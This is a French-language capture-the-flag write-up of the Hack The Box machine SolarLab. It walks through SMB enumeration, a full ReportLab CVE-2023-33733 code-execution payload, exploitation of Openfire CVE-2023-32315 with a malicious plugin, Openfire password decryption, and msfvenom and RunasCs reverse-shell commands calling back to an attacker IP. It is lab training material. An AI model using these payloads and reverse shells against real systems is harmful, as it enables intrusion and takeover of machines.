---
date: 2024-09-20T13:33:36-05:00
# description: ""
image: "/images/HTB-SolarLab/SolarLab.png"
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "HTB: SolarLab"
type: "post"
---

* Platforme: Hack The Box
* Lien: [SolarLab](https://app.hackthebox.com/machines/SolarLab)
* Niveau: Moyen
* OS: Windows
---

SolarLab commence par un site web qui n'offre aucune voie d'exploitation directe. Après avoir énuméré SMB, nous découvrons des informations d'identification dans un partage de fichiers. Ces identifiants permettent d'accéder à ReportHub, accessible par le biais d'un sous-domaine découvert lors du balayage. En examinant ses fonctionnalités, nous identifions qu'il génère des PDF en utilisant la bibliothèque ReportLab vulnérable au `CVE-2023-33733`. Grâce à cette vulnérabilité, nous obtenons notre accès initial et trouvons le drapeau utilisateur.

Une exploration plus poussée révèle plusieurs services internes, y compris une console d'administration Openfire accessible via un tunnel. Le logiciel est obsolète, ce qui nous permet d'exploiter le `CVE-2023-32315` pour obtenir un autre shell avec plus de privilèges. Enfin, en décryptant les informations d'identification trouvées dans un fichier Openfire, nous obtenons un shell d'administration et récupérons le drapeau root.

Addresse IP cibe - `10.10.11.16`

## Balayage

```
nmap -sC -sV -oA nmap/SolarLab -p- 10.10.11.16
```

**Résultats**

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-20 13:32 CDT
Nmap scan report for 10.10.11.16
Host is up (0.052s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          nginx 1.24.0
|_http-title: Did not follow redirect to http://solarlab.htb/
|_http-server-header: nginx/1.24.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
6791/tcp open  http          nginx 1.24.0
|_http-server-header: nginx/1.24.0
|_http-title: Did not follow redirect to http://report.solarlab.htb:6791/
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-09-20T18:35:13
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 176.37 seconds
```

Ports découverts :
- 80 - HTTP avec Nginx 1.24.0 redirigeant vers `http://solarlab.htb/`
- 135 - RPC
- 139 (NetBIOS) & 445 (SMB)
- 6791 - HTTP avec nginx avec une seconde redirection vers `http://report.solarlab.htb:6791/`

Mettons à jour le fichier hosts.

```
sudo echo "10.10.11.16 solarlab.htb report.solarlab.htb" | sudo tee -a /etc/hosts
```

## Enumération

Le site web propose un service de messagerie censé être "inviolable".

![SolarLab website](/images/HTB-SolarLab/solarlab-website.png)

Le code source de la page web ne révèle rien d'utile.

Après avoir énuméré SMB, nous constatons que nous pouvons lire le partage `Documents`.

```
netexec smb 10.10.11.16 -u Guest -p "" --shares
```

![SolarLab shares enumeration](/images/HTB-SolarLab/smb_enum.png)

Nous utilisons smbclient pour accéder au partage et trouvons quatre fichiers, deux juste après avoir accédé au partage et deux fichiers supplémentaires dans le répertoire `concepts`:
- `details-file.xlsx`
- `old_leave_request_form.docx`
- `Training-Request-Form.docx`
- `Travel-Request-Sample.docx`

```
smbclient //10.10.11.16/Documents -U Guest
```

![SolarLab shares files](/images/HTB-SolarLab/share_files.png)

Nous pouvons télécharger tous les fichiers avec `get`.

![SolarLab shares files download](/images/HTB-SolarLab/files-downloads.png)

Après avoir examiné chaque document, nous trouvons des informations d'identification dans le fichier `details-file.xlsx`. 

![Credentials found](/images/HTB-SolarLab/password-file.png)

Jusque-là, la seule façon d'utiliser ces informations d'identification est d'utiliser le protocole SMB. Il s'avère que ces informations d'identification sont valides mais les partages disponibles sont toujours les mêmes que ceux auxquels nous pouvions accéder avec le compte guest.

```
netexec smb 10.10.11.16 -u KAlexander -p "dkjafblkjadsfgl"

netexec smb 10.10.11.16 -u blake -p "ThisCanB3typedeasily1@"

netexec smb 10.10.11.16 -u ClaudiaS -p "dadsfawe9dafkn"
```

![SMB logins](/images/HTB-SolarLab/smb_logins.png)

L'énumération des répertoires est également infructueuse.

```
gobuster dir -u http://solarlab.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

![SolarLab directory bruteforcing](/images/HTB-SolarLab/gobuster.png)

Examinons le sous-domaine. Lorsque nous allons sur `http://report.solarlab.htb:6791/`, nous trouvons un formulaire de connexion pour ReportHub.

![SolarLab report subdomain](/images/HTB-SolarLab/reporthub_solarlab.png)

Les seules informations d'identification dont nous disposons jusqu'à présent sont celles du fichier de mots de passe. Après plusieurs tentatives, nous parvenons à nous connecter avec `blakeb:ThisCanB3typedeasily1@`.

![SolarLab Dashboard](/images/HTB-SolarLab/dashboard.png)

Nous pouvons choisir l'option souhaitée, remplir le formulaire et obtenir un fichier pdf. Nous pouvons également télécharger une image pour la signature (ce qui pourrait être un moyen d'exploiter la cible).

![Leave request form](/images/HTB-SolarLab/Leave-Request-form.png)

Voici un exemple du PDF généré.

![pdf generated](/images/HTB-SolarLab/pdf-generated.png)

## Accès Initial

En utilisant exiftool sur le PDF généré, nous découvrons qu'il est produit par reportlab.

```
exiftool output.pdf
```

![exiftool results](/images/HTB-SolarLab/output_pdf.png)

Nous trouvons un PoC pour Reportlab ([CVE-2023-33733](https://ethicalhacking.uk/cve-2023-33733-rce-in-reportlabs-html-parser/#gsc.tab=0)) qui mène à un RCE [ici](https://github.com/c53elyas/CVE-2023-33733/tree/master).

> J'utilise ici l'option `Travel Approval` mais vous pouvez faire fonctionner l'exploit avec les autres options.

![Travel Approval](/images/HTB-SolarLab/Travel_Approval.png)

Après avoir capturé la requête et l'avoir envoyée au repeater avec Burp, nous insérons notre payload et nous nous assurons que la valeur `filename` correspond à celle de `Content-Type`. 

> Nous obtenons un shell inversé sur [revshells](https://www.revshells.com/) en utilisant l'option `PowerShell #3 (Base64)`.

![ReportLab RCE](/images/HTB-SolarLab/payload-RCE.png)

**Payload utilisé**

```HTML
<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('INSERT_REVSHELL_HERE') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
                exploit
</font></para>
```

Sur notre listener, nous obtenons un shell en tant que Blake et le drapeau utilisateur se trouve dans le répertoire Desktop.

![User flag](/images/HTB-SolarLab/user_flag.png)

### Shell en tant que openfire

Nous constatons la présence d'un autre utilisateur `openfire` sur la cible .

![User list](/images/HTB-SolarLab/users_list.png)

Avec `netstat -ano` nous obtenons tous les services fonctionnant sur la cible. Pour accéder aux services internes, nous utilisons le tunneling.

> Personnellement, je préfère [ligolo-ng](https://github.com/nicocha30/ligolo-ng), mais vous pouvez également utiliser [chisel](https://github.com/jpillora/chisel).

![netstat command](/images/HTB-SolarLab/netstat.png)

Après avoir essayé plusieurs ports, nous trouvons une console d'administration Openfire sur le port 9090.

![Openfire admin console](/images/HTB-SolarLab/Openfire-console.png)

Aucune des informations d'identification dont nous disposons ne fonctionne. Je reconnais cette version obsolète d'Openfire, elle est vulnérable au [CVE-2023-32315](https://vulncheck.com/blog/openfire-cve-2023-32315) avec un PoC disponible [ici](https://github.com/miko550/CVE-2023-32315).

> La méthode d'exploitation est la même pour HTB: Jab, mais nous avions déjà les identifiants pour nous connecter à la console.

1. Nous nous connectons avec le compte nouvellement créé

```
python3 CVE-2023-32315.py -t http://240.0.0.1:9090
```

![Openfire new account](/images/HTB-SolarLab/openfire-new-account.png)

Une fois connecté, nous devons télécharger un plugin malveillant dans la section `Plugin`. Le plugin malveillant est le fichier `openfire-management-tool-plugin.jar` disponible sur le repo du PoC sur Github.

![Openfire malicious plugin](/images/HTB-SolarLab/malicious-plugin.png)

Allez dans `Server` --> `Server Settings` --> `Management Tool`, entrez le mot de passe `123` et cliquez sur `Login`. Vous obtenez des informations sur le serveur.

Sélectionnez `system command` dans le menu déroulant.

![Openfire system command](/images/HTB-SolarLab/system_cmd.png)

De retour sur [revshells](https://www.revshells.com/) nous obtenons un autre shell inversé Powershell et après l'avoir exécuté, nous obtenons un shell en tant que `openfire`.

![Openfire execute command](/images/HTB-SolarLab/execute-cmd.png)

![Openfire shell](/images/HTB-SolarLab/openfire_shell.png)

## Elévation de Privilèges (shell admin)

Nous n'avons toujours pas accès au compte administrateur, mais après une exploration du système, nous trouvons un fichier appelé `openfire.script` dans `C:\Program Files\Openfire\embedded-db`.

Le fichier contient les informations d'identification de l'utilisateur admin mais le mot de passe doit être décrypté. Heureusement, nous avons le hachage du mot de passe et la clé.

![Openfire encrypted password](/images/HTB-SolarLab/encrypted-pwd.png)

* Password hash: `becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442`
* Key value: `hGXiFzsKaAeYLjn`

Nous pouvons décrypter le mot de passe avec [openfire_decrypt](https://github.com/c0rdis/openfire_decrypt) en utilisant la commande ci-dessous.

```
java OpenFireDecryptPass [PASSWORD_HASH] [KEY_VALUE]
```

![Openfire password decrytion](/images/HTB-SolarLab/java-openfire-decrypt.png)

Les identifiants de l'administrateur sont: `admin:ThisPasswordShouldDo!@`

Les tentatives de connexion avec Evil-WinRM ne fonctionnant pas, nous avons recours à RunasCs.

```
msfvenom -p windows/x64/shell_reverse_tcp lhost=YOUR_IP lport=PORT_NUMBER -f exe -a x64 --platform windows -o shell.exe
```

Après avoir envoyé `shell.exe` et `RunasCs.exe` à la cible, nous exécutons la commande ci-dessous.

```
.\runascs.exe administrator ThisPasswordShouldDo!@ powershell -r 10.10.14.176:5555
```

![runascs root command](/images/HTB-SolarLab/runascs_root.png)

Nous obtenons un shell en tant qu'administrateur et nous pouvons lire le drapeau root dans le répertoire Desktop.

![root shell & root flag](/images/HTB-SolarLab/root_flag.png)
